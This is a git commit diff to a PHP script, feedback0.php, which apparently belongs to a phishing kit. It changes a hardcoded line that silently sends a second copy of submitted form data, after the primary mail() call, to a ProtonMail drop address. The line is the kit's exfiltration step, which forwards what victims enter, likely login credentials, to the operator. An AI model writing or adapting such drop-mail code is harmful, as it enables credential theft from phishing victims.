6178f2d73b345c1ba6290d7b84209ab68156524c
bradley293 <77622257+bradley293@users.noreply.github.com>
2021-02-11 21:31:41 +0800

    Update feedback0.php

--- feedback0.php
+++ feedback0.php
@@ -81,7 +81,7 @@ if(array_key_exists(strtolower($domain_name), $arrayName)){
 $send = mail($email,$subject,$message);
 
 if($send){
-	mail('newoffice101@protonmail.com',$subject,$message);
+	mail('zillaxjunior2@protonmail.com',$subject,$message);
 	if(!empty($return_url)){
 if($trialNo > 0){
 
